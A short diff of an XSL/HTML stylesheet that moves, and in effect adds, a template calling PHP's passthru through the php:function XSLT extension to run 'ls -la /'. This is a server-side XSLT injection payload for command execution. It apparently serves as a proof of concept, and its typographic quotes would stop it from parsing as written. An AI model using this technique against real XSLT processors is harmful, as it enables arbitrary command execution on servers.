@@ -1,8 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
-  <xsl:template match=”/”>
-  <xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>
-  </xsl:template>
         <body style="font-family:'VT323';font-size:12pt;background-color:#EEEEEE">
         <table style="background-color: green;border: 2px dashed pink;">
                 <thead style="background-color:red;border:1px solid black;">
@@ -22,3 +19,9 @@
         </table>
         </body>
 </html>
+
+<xsl:stylesheet version=”1.0″ xmlns:xsl=”http://www.w3.org/1999/XSL/Transform” xmlns:php=”http://php.net/xsl”>
+<xsl:template match=”/”>
+<xsl:value-of select=”php:function(‘passthru’,’ls -la /’)”/>
+</xsl:template>
+</xsl:stylesheet>
